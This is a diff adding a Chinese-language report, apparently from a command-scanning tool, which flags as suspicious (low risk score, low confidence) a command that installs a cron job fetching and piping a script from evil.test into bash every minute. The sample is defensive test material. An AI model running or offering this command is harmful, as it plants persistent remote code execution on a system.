@@ -1,0 +1,11 @@
+⚠️ 判定: SUSPICIOUS (风险分: 25/100, 置信度: LOW)
+命令: echo '* * * * * curl http://evil.test/beacon | bash' | crontab -
+
+发现 1 个问题 (0 严重, 1 警告):
+  [WARN] 静态分析: 命令匹配恶意模式: download and execute (curl|sh) [T1105]
+
+涉及 ATT&CK 战术: Command and Control
+
+建议:
+  • REVIEW: 建议人工审核此命令后再决定是否放行
+  • 置信度较低, 可能为误报, 请结合上下文判断
